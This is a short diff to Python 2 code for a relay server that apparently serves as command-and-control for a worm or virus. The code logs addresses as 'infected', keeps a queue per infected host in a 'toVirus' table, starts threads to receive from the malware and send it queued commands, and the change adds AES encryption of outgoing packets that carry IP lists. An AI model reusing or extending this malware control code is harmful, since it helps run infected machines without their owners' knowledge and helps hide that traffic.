@@ -59,6 +59,7 @@ class RelayServer:
         pkt.state = state
         pkt.length = str(length)
         pkt.data = data
+        pkt.encryptData(self.AESKey)
         print "IPList: " + data
         if address != "":
             pkt.returnIP = address[0]
@@ -71,7 +72,6 @@ class RelayServer:
         print address[0] + " infected!"
         q = Queue()
         self.toVirus[address[0]] = (client,q,None)
-        # self.sendIPList()
         t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
         t.start()
         threading.Thread(target=self.dequeue,args=[q,client,t]).start()
